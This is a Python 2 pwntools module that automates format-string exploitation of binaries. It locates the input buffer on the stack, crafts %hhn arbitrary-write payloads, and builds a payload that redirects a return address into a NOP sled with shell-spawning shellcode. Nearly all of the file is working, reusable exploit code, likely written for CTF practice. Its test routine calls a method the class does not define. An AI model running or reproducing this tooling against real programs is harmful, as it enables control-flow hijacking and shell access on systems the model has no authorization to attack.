#!/usr/bin/env python
import sys
from process import Process
from pwn import *

class Format_String(Process):

    def __init__(self, filename):
        Process.__init__(self, filename)
        context.log_level = 'CRITICAL'
        context.delete_corefiles = True
        self.elf = context.binary = ELF(filename)
        self.rop = ROP(self.elf)

        self.debug = True
        self.max_stack_arg = 1000

    ##########################################
    ##### General Format String Exploits #####
    ##########################################

    # Find where the user input is
    # Optional argument:
    #   - f_exp: function(fstring, *args) -> output
    def find_buf_arg(self, buf_len=64, f_exp=None, *f_args):

        # Default format string exploit function
        if (f_exp == None):
            f_exp = self.start_and_sendline_out

        # Find which argument is the start of the buffer
        base = 1
        while (base < self.max_stack_arg):
            payload = ""
            # Fit inside the buffer the maximum format string
            for i in xrange(base, self.max_stack_arg):
                if (len(payload + "%{}$08x".format(i)) <= buf_len):
                    payload += "%{}$08x".format(i)
                else:
                    break
            # Send the payload and see if the buffer is returned back
            out = f_exp(payload, *f_args)
            index = out.find("{:08x}".format(u32(payload[:4])))
            if (index != -1):
                return base + (index / 8)
            else:
                base = i 
        return 0

    # Find where the user input is
    # Optional argument:
    #   - f_exp: function(fstring, *args) -> output
    def find_buf_addr_arg(self, f_exp=None, *f_args):

        # Default format string exploit function
        if (f_exp == None):
            f_exp = self.start_and_sendline_out

        # Find which argument is the pointer to the buffer
        for i in xrange(1, self.max_stack_arg):
            payload = "%{}$s".format(i)
            out = f_exp(payload, *f_args)
            if (payload in out):
                return i
        return 0

    # Generate payload to write "what" to "where" via format strings.
    # It is assumed buffer can fit the payload and "what"+"where" are integers.
    # Optional argument:
    #   - fexp: function(fstring, *args) -> output
    def fstring_write(self, what, where, num_bytes=0, buf_len=64, f_exp=None, *f_args):

        # Default format string exploit function
        if (f_exp == None):
            f_exp = self.start_and_sendline_out

        # Figure out what argument contains the start of our payload
        arg = self.find_buf_arg(buf_len, f_exp, *f_args)

        # If num_bytes is architecture dependant
        if (num_bytes == 0):
            num_bytes = 4 
            if ("64" in self.arch):
                num_bytes = 8 

        # Add all the byte addresses for writing
        payload = ""
        for _unused in xrange(num_bytes):
            payload += self.p(where)
            where +=1

        # Add all the writing format specifiers
        mask = 0xFF
        prev_value = len(payload)
        for i in xrange(num_bytes):
            byte_value = (what >> (i*8)) & mask
            pad_value = byte_value - prev_value
            if (i != 0): pad_value += 0x100
            payload += "%{}u%{}$hhn".format(pad_value, arg+i)
            prev_value = byte_value
    
        # Log some helpful information
        if (self.debug):
            log.info("====================\n"+
                    "| What: "+hex(what)+'\n'+
                    "| Where: "+hex(where)+'\n'+
                    "| Payload length: "+str(len(payload))+'\n'+
                    "| Payload: "+payload+'\n'+
                    "====================")
        return payload

    # Generate payload to jump into own buffer shellcode.
    # Optional arguments:
    #   - exploit_fstring: function(fstring, *args) -> output
    def fstring_shellcode_jump(self, buf_addr, return_addr, buf_len=64, shellcode=None, f_exp=None, *f_args):

        # Default shellcode
        if (shellcode == None):
            shellcode = asm(shellcraft.sh())

        # Default format string exploit function
        if (f_exp == None):
            f_exp = self.start_and_sendline_out

        # Figure out what argument contains the start of our payload
        arg = self.find_buf_arg(buf_len, f_exp, *f_args)

        # Based on the architecture determine the number of bytes to write
        num_to_write = 4
        if ("64" in self.arch):
            num_to_write = 8

        # Add all the byte addresses for writing
        payload = ""
        for _unused in xrange(num_to_write):
            payload += self.p(return_addr)
            return_addr +=1

        # Add all the writing format specifiers
        jump_addr = buf_addr + len(payload) + 12*(len(payload)/num_to_write)
        mask = 0xFF
        prev_value = len(payload)
        for i in xrange(num_to_write):
            byte_value = (jump_addr >> (i*8)) & mask
            pad_value = byte_value - prev_value
            if (i != 0): pad_value += 0x100
            payload += "%{}d%{}$hhn".format(pad_value, arg+i)
            prev_value = byte_value

        # Add the shellcode
        curr_addr = buf_addr + len(payload)
        if (curr_addr > jump_addr):
            return None
        else:
            for _unused in xrange(curr_addr, jump_addr):
                payload += '\x90'
            payload += shellcode

        # Log some helpful information
        if (self.debug):
            log.info("====================\n"+
                    "| Buffer start: "+hex(buf_addr)+'\n'+
                    "| Return address: "+hex(return_addr)+'\n'+
                    "| Distance appart: "+hex(return_addr-buf_addr)+'\n'+
                    "| NOPsled offset: "+str(curr_addr-buf_addr)+'\n'+
                    "| Shellcode offset: "+str(jump_addr-buf_addr)+'\n'+
                    "| Payload length: "+str(len(payload))+'\n'+
                    "| Payload: "+payload+'\n'+
                    "====================")
        return payload


###################
##### TESTING #####
###################

def test_module(argv):
    if (len(sys.argv) != 2):
        log.failure("Usage: "+argv[0]+" <test_binary>")
        exit(1) 
    fstring = Format_String(sys.argv[1])
    print fstring.find_fstring_arg(0x40)

if __name__ == "__main__":
    test_module(sys.argv)
